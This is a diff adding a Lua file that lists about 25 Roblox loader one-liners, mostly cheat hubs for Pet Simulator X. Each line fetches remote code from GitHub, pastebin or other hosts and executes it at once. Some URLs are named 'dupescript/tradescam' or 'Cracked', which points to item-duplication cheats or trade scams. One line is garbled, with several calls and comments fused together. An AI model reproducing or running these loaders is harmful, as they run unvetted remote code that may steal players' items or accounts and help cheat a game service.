@@ -1,0 +1,25 @@
+loadstring(game:HttpGet("https://lkhub.net/s/loader.lua"))();
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Alleexxi/releasedscritps/main/script%20(1).lua"),true))();
+loadstring(game:HttpGet("https://pastebin.com/raw/95HthyJq"))();
+loadstring(game:HttpGet("https://pastebin.com/raw/YbzJB9Kd"))();
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Boxking776/GrubHub/main/Partner.lua")))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/S4nZz/bt_project/main/Games/BlacktrapScript.txt"))();
+loadstring(game:HttpGet("https://milkup.info/script/PetSimulatorX/"))();
+loadstring(game:HttpGet("https://rawscripts.net/raw/CATS-or-Pet-Simulator-X!-Pasta-v2-6841"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/4lve/Roblox/main/PetSimX.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BLACKGAMER1221/Pet-Simulator-X/main/BK%20Pet.lua"))();
+loadstring(game:HttpGet("https://rawscripts.net/raw/EVENT!-Pet-Simulator-X!-Paste-Pasta-2267",linest==braindead))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TurfuGoldy/GoldenScripts/main/EzPets.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/saskeee129304/dupescript/main/tradescam", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts-Project-wd/autofarm/main/ProjectScripts"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reflectivezxsucks/Milkup-Cracked/main/Main"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Julikaan/Pet-Simulator-X-StarHub-script/main/PSX%20StarHub%20Script"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mooose88/dupescript/main/tradescam", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/petsimulatorx221/DupeScript/main/dupeluascript.lua", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RobIoxScripts/GUI/main/load.lua"))();
+loadstring(game:HttpGet("https://system-exodus.com/scripts/PetSimulator/PetSimulatorX.lua", true))();
+loadstring(game:HttpGet("https://rawscripts.net/raw/CATS-or-Pet-Simulator-X!-Pasta-v2-6841"))() -- Phantom Hubloadstring(game:HttpGet("https://raw.githubusercontent.com/destylol/masterhubv311/itachi/Main.lua"))() -- Moonlight Hubloadstring(game:HttpGet("https://cookie-hosting.xyz/Roblox/Moonlight/Loader.lua"))() -- Bk Petloadstring(game:HttpGet("https://raw.githubusercontent.com/BLACKGAMER1221/Pet-Simulator-X/main/BK%20Pet.lua"))() -- Ghost Pet Xloadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptRUs/Ryans/main/GhostHub-PetSimX.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimulatorX1/PetSimulatorXScripts/main/dupe.lua",true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimulatorX1/PetSimulatorXScripts/main/mastery.lua",true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimulatorX1/PetSimulatorXScripts/main/scripthub.lua",true))();
